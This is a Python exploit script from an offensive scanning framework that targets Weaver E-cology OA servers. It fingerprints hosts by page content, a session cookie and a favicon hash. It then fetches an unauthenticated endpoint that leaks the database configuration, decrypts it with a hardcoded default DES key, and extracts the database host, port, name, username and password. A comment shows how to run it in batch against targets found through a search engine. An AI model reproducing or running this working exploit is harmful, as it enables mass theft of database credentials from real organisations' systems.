# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 23:29

from core.data import gLogger
from core.utils.cipher import decodeDes128bit
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# app="泛微-协同办公OA"
# python batch.py -m exploit.scripts.OA.Weaver.E-Weaver.unauth_readfile_database -cs -fs "app=\"泛微-协同办公OA\""

class Script(BaseScript):
    name = 'E-Weaver'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level= BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://github.com/z1un/weaver_exp/blob/a3f5f60114c131604af2f29932d14da89c330388/poc/E_Cology_Database_Leak.py'
        # 特定路径判断
        self.detect_path_list = ['/favicon.ico']
        # exec
        self.exec_path_list = ['/mobile/DBconfigReader.jsp']
        # 相关信息
        self.info = ''
        # favicon
        self.favicon_md5_list = ['41eca7a9245394106a09b2534d8030df']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                if response is not None:
                    await asyncio.sleep(2)
                    text = await response.text()
                    if 'ecology9/js/lib.js' in text or '/wui/common/css/w7ovfont.css' in text or 'typeof poppedwindow' in text or 'client/jquery.client_wev8.js' in text or '/theme/ecology8/jquery/js/zdialog_wev8.js' in text or 'ecology8/lang/weaver_lang_7_wev8.js' in text:
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                    if 'ecology_JSessionId' in response.headers.get('Set_Cookie', ''):
                        self.flag = True
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                        return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None:
                    await asyncio.sleep(2)
                    data = decodeDes128bit('1z2x3c4v5b6n', text)  # 这里使用的就是默认的数据库解密密钥，1z2x3c4v5b6n
                    if data:
                        data = data.strip()
                        # 下面来进行填充即可
                        db_type = str(data).split(';')[0].split(':')[1]
                        db_url = str(data).split(';')[0].split(':')[2].split('//')[1]
                        db_port = str(data).split(';')[0].split(':')[3]
                        db_name = str(data).split(';')[1].split(',')[0].split('=')[1]
                        db_user = str(data).split(';')[1].split(',')[1].split('=')[1]
                        db_pass = str(data).split(';')[1].split(',')[2].split('=')[1]
                        db_all_infor = '{} - {} - {} - {} - {} - {}'.format(db_type, db_url, db_port, db_name, db_user, db_pass)
                        gLogger.myscan_info('[{} ReadFile Database] {}'.format(self.name, url))
                        return {'name': '{} ReadFile Database {}'.format(self.name, db_all_infor), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass